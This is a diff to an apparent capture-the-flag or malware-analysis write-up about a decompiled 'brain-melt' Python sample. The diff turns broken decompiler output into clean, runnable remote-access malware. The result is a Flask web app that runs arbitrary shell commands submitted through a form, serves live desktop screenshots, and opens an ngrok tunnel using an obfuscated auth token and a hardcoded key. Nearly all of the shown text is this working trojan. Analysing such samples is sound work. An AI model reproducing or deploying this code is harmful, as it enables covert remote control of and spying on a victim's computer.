@@ -18,28 +18,20 @@ For pyc file we need to recover the python code, i always use pycdc tool for it,
 5) execute function runs a shell command and flashes the output to the web interface.<br>
 
 ```
-# Source Generated with Decompyle++
-# File: brain-melt-2.pyc (Python 3.8)
-
 from flask import Flask, flash, request, render_template_string, send_file, redirect
-from wtforms import Form, StringField, validators, StringField, SubmitField
+from wtforms import Form, StringField, validators, SubmitField
 import subprocess
 import pyautogui
 import io
 from PIL import Image
 from Crypto.Cipher import Salsa20
 from pyngrok import ngrok
-import base65
-DEBUG = True
-app = Flask(__name__)
-app.config['SECRET_KEY'] = '9EQrXQ88pwP7UWaXbkmThhKuDdYxsad1'
+import base64
+import os
 
-#def decrypt1(    ):
-#         = ''
-#    for      in range(0, len(    ), 2):
-#             = str(    [    :     + 2] + '==')
-#             += str(base64.b64decode(    ).decode('ascii'))
-#    return
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
 def decrypt1(encrypted_str):
     decoded_str = ''
     for i in range(0, len(encrypted_str), 2):
@@ -50,20 +42,15 @@ def decrypt1(encrypted_str):
 def decrypt2(a1, a2):
     result = ''
     for character in a1:
-        a2 = 9
         tempcharaddedr = 'temporary value'
         result += chr(((ord(character) - ord('a')) + a2) % 26 + ord('a'))
     return result
 
-
 def decrypt3(s1, key):
     msg_nonce = s1[:8]
     ciphertext = s1[8:]
-    key = glob_key
-    ab = key
-    cipher = Salsa20.new(key.encode('utf-8'), msg_nonce, **('key', 'nonce'))
-    return cipher.decrypt(ciphertext_obfuscation_padding).decode('utf-8')
-
+    cipher = Salsa20.new(key=key.encode('utf-8'), nonce=msg_nonce)
+    return cipher.decrypt(ciphertext).decode('utf-8')
 
 def deobfuscate():
     part1 = decrypt1('ZgbAYQZwewMAOAZQOQYwYwNQYgMA')
@@ -72,60 +59,76 @@ def deobfuscate():
     key = part1 + part2 + part3
     return key
 
-
 def ngrok_tunnel():
     ngrok.set_auth_token(deobfuscate())
-    http_tunnel = ngrok.connect(5000, 'http')
-
+    http_tunnel = ngrok.connect(5000)
+    print(f" * Tunnel URL: {http_tunnel.public_url}")
 
 def Desktop(pil_img):
     img_io = io.BytesIO()
-    pil_img.save(img_io, 'JPEG', 70, **('quality',))
+    pil_img.save(img_io, 'JPEG', quality=70)
     img_io.seek(0)
-    return send_file(img_io, 'image/jpeg', **('mimetype',))
-
+    return send_file(img_io, mimetype='image/jpeg')
 
 def execute(cmd):
-    child = subprocess.Popen(cmd, True, subprocess.PIPE, subprocess.PIPE, **('shell', 'stdout', 'stderr'))
-    for line in child.stdout:
-        print(line)
-        l = line.decode('utf-8', 'ignore', **('encoding', 'errors'))
-        flash(l)
-    for line in child.stderr:
-        l = line.decode('utf-8', 'ignore', **('encoding', 'errors'))
-        flash(l)
-
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
+        flash(result.stdout)
+        flash(result.stderr)
+    except subprocess.CalledProcessError as e:
+        flash(f"Error: {e}")
 
 class CommandForm(Form):
-    command = StringField('Command:', [
-        validators.required()], **('validators',))
-    
-    def display():
-        form = CommandForm(request.form)
-        print(form.errors)
-        if request.method == 'POST':
-            command = request.form['command']
-        if form.validate() and request.method == 'POST':
-            result = execute(command)
-            flash(result)
-        else:
-            flash('Please enter a command.')
-        return render_template_string('<!doctype html>\n                <html>\n                    <head>\n                        <link rel="stylesheet" href="css url"/>\n                            </head>\n                                <body>\n                                    <form action="" method="post" role="form">\n                                        <div class="form-group">\n                                              <label for="Command">Command:</label>\n                                              <input type="text" class="form-control" id="command" name="command"></div>\n                                              <button type="submit" class="btn btn-success">Submit</button>\n                                              </form>\n                                            {% for message in get_flashed_messages() %}\n                                            <p>{{ message }}</p>\n                                            {% endfor %}\n                                            <img src="/images/desktop.jpg" id="img" width="100%" scrolling="yes" style="height: 100vh;"></iframe>\n                                </body>\n                            \n                            {% block javascript %}\n                            <script type="text/javascript">\n                            window.onload = function() {\n                                var image = document.getElementById("img");\n\n                                function updateImage() {\n                                    image.src = image.src.split("?")[0] + "?" + new Date().getTime();\n                                }\n\n                                setInterval(updateImage, 1000);\n                            }\n                            </script>\n                            {% endblock %}\n                            </html>\n                        ', form, **('form',))
+    command = StringField('Command:', [validators.DataRequired()])
+    submit = SubmitField('Submit')
 
-    display = app.route('/', [
-        'GET',
-        'POST'], **('methods',))(display)
+@app.route('/', methods=['GET', 'POST'])
+def display():
+    form = CommandForm(request.form)
+    if request.method == 'POST' and form.validate():
+        command = form.command.data
+        execute(command)
+    return render_template_string('''<!doctype html>
+        <html>
+        <head>
+            <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+        </head>
+        <body>
+            <div class="container">
+                <h1>Command Executor</h1>
+                <form method="post">
+                    <div class="form-group">
+                        <label for="command">Command:</label>
+                        <input type="text" class="form-control" id="command" name="command">
+                    </div>
+                    <button type="submit" class="btn btn-success">Submit</button>
+                </form>
+                {% for message in get_flashed_messages() %}
+                <div class="alert alert-info">{{ message }}</div>
+                {% endfor %}
+                <img src="/images/desktop.jpg" id="img" width="100%" style="height: 100vh;">
+            </div>
+            <script type="text/javascript">
+                window.onload = function() {
+                    var image = document.getElementById("img");
+                    function updateImage() {
+                        image.src = image.src.split("?")[0] + "?" + new Date().getTime();
+                    }
+                    setInterval(updateImage, 1000);
+                }
+            </script>
+        </body>
+        </html>''', form=form)
 
-
+@app.route('/images/desktop.jpg')
 def serve_img():
     screenshot = pyautogui.screenshot()
     return Desktop(screenshot)
 
-serve_img = app.route('/images/desktop.jpg')(serve_img)
 if __name__ == '__main__':
     glob_key = '24a0b299984ee8da7aae14b7163e2e63'
     ngrok_tunnel()
-    app.run('0.0.0.0', **('host',))
+    app.run(host='0.0.0.0', debug=False)
 
 ```
 <br>
